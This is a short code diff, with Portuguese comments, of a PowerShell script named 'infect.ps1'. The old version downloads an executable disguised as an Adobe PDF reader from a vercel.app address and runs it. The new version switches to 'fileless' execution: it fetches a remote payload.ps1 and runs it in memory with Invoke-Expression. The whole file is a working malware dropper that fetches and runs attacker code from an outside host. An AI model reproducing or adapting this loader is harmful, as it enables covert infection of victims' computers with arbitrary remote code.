@@ -1,4 +1,13 @@
-# infect.ps1
-$payload = "https://testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe";
-Invoke-WebRequest $payload -OutFile "$env:TEMP\Adobe Documento PDF.exe";
-Start-Process "$env:TEMP\Adobe Documento PDF.exe";
+# infect.ps1 (fileless execution)
+$payload = "https://testando123-blond.vercel.app/payload.ps1"
+
+try {
+    # Baixa o conteúdo do script remoto como texto
+    $script = Invoke-WebRequest -Uri $payload -UseBasicParsing | Select-Object -ExpandProperty Content
+
+    # Executa o conteúdo diretamente na memória
+    Invoke-Expression $script
+}
+catch {
+    Write-Host "Erro ao carregar o payload: $_"
+}
